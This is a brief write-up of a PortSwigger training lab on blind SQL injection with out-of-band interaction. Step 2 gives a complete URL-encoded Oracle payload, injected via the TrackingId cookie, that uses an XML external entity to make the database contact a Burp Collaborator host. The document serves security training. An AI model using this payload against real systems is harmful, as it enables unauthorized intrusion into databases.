# SQL Injection - Blind SQL injection with out-of-band interaction

## 📌 Lab Details
- **Title**: Blind SQL injection with out-of-band interaction
- **Difficulty**: Practitioner
- **Category**: SQL Injection
- **Lab URL**: https://portswigger.net/academy/labs/launch/bd885d4dca761e440e1c4056234b100f514a5ba06cb79df59a7fdb02eda2af17?referrer=%2fweb-security%2fsql-injection%2fblind%2flab-out-of-band

## 🔍 Summary
This lab demonstrates exploiting **blind SQL injection via out-of-band DNS interactions using Burp Collaborator** when there is no visible response change.

## 🛠 Steps to Solve
1. Use Burp Suite to intercept and modify the request containing the `TrackingId` cookie.
2. Modify the `TrackingId` cookie and inject the payload: `TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`.
3. Insert the **Collaborator** payload and complete the lab.

## 📖 Key Takeaways
- Blind SQLi can be exploited using **OOB techniques** when no direct response is visible.
- Oracle’s `EXTRACTVALUE` + `XMLTYPE` can be abused for OOB payloads.

## 🖼️ Screenshot 
![image](https://github.com/user-attachments/assets/1ba41d6c-8a18-4fa8-8bac-3c3e4516b32f)
![image](https://github.com/user-attachments/assets/3569cbca-4e7e-40e9-8cbd-d601b6151280)
![image](https://github.com/user-attachments/assets/0cb18b94-fed0-4840-a7ee-205221429cd3)
![image](https://github.com/user-attachments/assets/fc505601-d35b-4052-903a-4a95d7e1f4d9)
